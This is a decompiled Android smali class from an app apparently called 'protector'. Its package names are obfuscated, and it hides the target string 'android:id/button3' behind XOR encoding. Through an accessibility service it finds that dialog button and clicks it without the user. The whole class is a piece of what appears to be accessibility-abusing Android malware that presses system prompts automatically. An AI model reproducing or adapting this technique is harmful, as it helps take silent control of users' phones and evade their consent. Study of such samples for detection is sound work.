.class Lcom/icontrol/protector/m$j$a$a$a$b$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/m$j$a$a$a$b;->a()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/icontrol/protector/m$j$a$a$a$b;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/m$j$a$a$a$b;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/m$j$a$a$a$b$a;->a:Lcom/icontrol/protector/m$j$a$a$a$b;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a()V
    .locals 3

    .line 1
    const/16 v0, 0xc8

    invoke-static {v0}, Lcom/icontrol/protector/m;->a0(I)V

    sget-object v0, Lcom/icontrol/protector/m;->a:Lcom/icontrol/protector/AccessServices;

    const/16 v1, 0x12

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_0

    const/4 v1, 0x0

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v1, 0x10

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_0
    return-void

    :array_0
    .array-data 1
        0x68t
        0x11t
        -0x54t
        -0x6t
        -0x5ft
        -0x4et
        -0x4et
        -0x2dt
        0x60t
        0x1bt
        -0x19t
        -0x16t
        -0x45t
        -0x51t
        -0x5et
        -0x7at
        0x67t
        0x4ct
    .end array-data

    nop

    :array_1
    .array-data 1
        0x9t
        0x7ft
        -0x38t
        -0x78t
        -0x32t
        -0x25t
        -0x2at
        -0x17t
    .end array-data
.end method
